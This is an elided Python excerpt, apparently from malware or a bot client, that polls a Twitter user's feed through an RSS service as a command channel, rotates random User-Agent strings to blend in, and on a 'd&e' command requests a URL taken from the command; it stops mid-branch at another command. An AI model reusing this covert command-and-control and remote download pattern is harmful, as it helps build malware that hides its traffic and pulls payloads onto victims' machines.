...
def getTask():
    ...
    header = {'User-Agent': ua_strings[randint(1, len(ua_strings))]}
    r = requests.get("https://twitrss.me/twitter_user_to_rss/?user="+twitter_user, headers=header)
...
while True:
    ...
    if tmp[0] == "d&e":
        ...
        header = {'User-Agent': ua_strings[randint(1, len(ua_strings))]}
        requests.get(tmp[1], headers=header, allow_redirects=True)
    elif tmp[0] == "de&agr":
